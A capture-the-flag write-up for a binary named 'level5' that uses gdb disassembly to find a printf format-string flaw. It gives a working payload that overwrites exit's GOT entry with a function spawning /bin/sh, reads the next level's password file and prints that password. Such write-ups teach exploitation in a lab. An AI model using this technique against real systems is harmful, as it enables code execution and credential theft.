# Analysis

Examine the program's functions:

```bash
(gdb) info functions
[...]
0x080484a4  o
0x080484c2  n
0x08048504  main
[...]
(gdb) disassemble main
Dump of assembler code for function main:
0x08048504 <+0>:     push   %ebp
0x08048505 <+1>:     mov    %esp,%ebp
0x08048507 <+3>:     and    $0xfffffff0,%esp
0x0804850a <+6>:     call   0x80484c2 <n>
0x0804850f <+11>:    leave
0x08048510 <+12>:    ret
End of assembler dump.
(gdb) disassemble n
Dump of assembler code for function n:
0x080484c2 <+0>:     push   %ebp
0x080484c3 <+1>:     mov    %esp,%ebp
0x080484c5 <+3>:     sub    $0x218,%esp
0x080484cb <+9>:     mov    0x8049848,%eax
0x080484d0 <+14>:    mov    %eax,0x8(%esp)
0x080484d4 <+18>:    movl   $0x200,0x4(%esp)
0x080484dc <+26>:    lea    -0x208(%ebp),%eax
0x080484e2 <+32>:    mov    %eax,(%esp)
0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
0x080484ea <+40>:    lea    -0x208(%ebp),%eax
0x080484f0 <+46>:    mov    %eax,(%esp)
0x080484f3 <+49>:    call   0x8048380 <printf@plt>
0x080484f8 <+54>:    movl   $0x1,(%esp)
0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
(gdb) disassemble o
Dump of assembler code for function o:
0x080484a4 <+0>:     push   %ebp
0x080484a5 <+1>:     mov    %esp,%ebp
0x080484a7 <+3>:     sub    $0x18,%esp
0x080484aa <+6>:     movl   $0x80485f0,(%esp)
0x080484b1 <+13>:    call   0x80483b0 <system@plt>
0x080484b6 <+18>:    movl   $0x1,(%esp)
0x080484bd <+25>:    call   0x8048390 <_exit@plt>
End of assembler dump.
(gdb) x/s 0x80485f0
0x80485f0:       "/bin/sh"
(gdb) disassemble exit
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.
```

## Key Observations
- `main` calls `n`.
- `n` uses `fgets` for input and `printf`, which is vulnerable to format string exploits.
- `o` calls `system("/bin/sh")`.
- `exit` function is used in `n`, so we can't use a return-to-libc to directly call `o`.

# Clue for Exploration

Think about how you can manipulate the execution flow given these constraints:

- **Format String Vulnerability**: How does `printf` interpret user input, especially with format specifiers?
- **Function Addresses**: Consider how you might redirect the program to execute a different function. How are function addresses used in the program's execution?

Explore these aspects to guide your approach in crafting an exploit.

# Crafting the Exploit

We'll use the format string vulnerability to manipulate the execution flow.

## Locating the Input on the Stack

Identify where the input string is placed on the stack:

```bash
$ python -c 'print("AAAA" + "%x %x %x %x")' | ./level5
AAAA200 b7fd1ac0 b7ff37d0 41414141
```

Here, `41414141` (hexadecimal for "AAAA") indicates our input string's position at the fourth place on the stack.

## Building the Payload

We'll construct a payload to overwrite the address where `exit` is called with the address of `o`:

```bash
$ (python -c 'print("\x08\x04\x98\x38"[::-1] + "%134513824p" + "%4$n")' && echo 'cat /home/user/level6/.pass') | ./level5
```

In this payload:
- `"\x08\x04\x98\x38"[::-1]` is the little-endian representation of the address where `exit` is called (`0x8049838`).
- `%134513824p` pads the output to the exact byte count needed (`134513828` minus the 4 bytes of the address itself).
- `%4$n` writes this byte count to the fourth position on the stack, overwriting the `exit` function's calling address with the address of `o`.

## Exploit Execution

Executing this payload triggers the `o` function instead of `exit`:

```plaintext
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

The exploit successfully opens a shell, allowing us to access the next level's password. The process is slow due to the large number of bytes being written.
